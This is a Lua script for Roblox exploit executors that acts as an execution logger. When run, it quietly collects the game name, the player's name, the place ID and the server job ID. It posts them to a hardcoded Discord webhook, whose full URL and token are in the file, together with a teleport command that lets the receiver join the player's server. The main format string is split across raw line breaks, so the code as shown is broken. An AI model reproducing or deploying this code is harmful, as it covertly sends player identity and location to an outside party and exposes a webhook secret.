local webhook_url = "https://discord.com/api/webhooks/1339113726506434600/u3b1aIA1Rz2ZvpOLT8xiYe4RlBGBShohSCKzvwyUnHjJLIPxW5O3FEf8p46oMJzIn_Ss"

local function send_to_webhook(game_name, player_name, place_id, job_id)
    local http_request = syn and syn.request or (http and http.request) or request
    if not http_request then
        warn("Your executor does not support HTTP requests.")
        return
    end

    local content_message = string.format(
        "
lua\ngame:GetService(\"TeleportService\"):TeleportToPlaceInstance(%d, \"%s\")\n
",
        place_id,
        job_id
    )

    local embed = {
        ["title"] = "New Execution",
        ["description"] = string.format("Game Name: %s\nPlayer Name: %s", game_name, player_name),
        ["color"] = 16711680
    }

    local payload = {
        ["content"] = content_message,
        ["embeds"] = {embed}
    }

    local success, response = pcall(function()
        return http_request({
            Url = webhook_url,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = game:GetService("HttpService"):JSONEncode(payload)
        })
    end)

    if not success then
        warn("Error sending the HTTP request.")
        return
    end

    if response.StatusCode == 200 then
        print("Message successfully sent to the webhook.")
    else
        warn("Failed to send message: ", response.StatusMessage, " - Code: ", response.StatusCode)
    end
end

local game_name = "Unknown"
local player_name = "Unknown"
local place_id = game.PlaceId
local job_id = "Unknown"

pcall(function()
    game_name = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
end)

pcall(function()
    player_name = game:GetService("Players").LocalPlayer.Name
end)

pcall(function()
    job_id = game.JobId
end)

send_to_webhook(game_name, player_name, place_id, job_id)
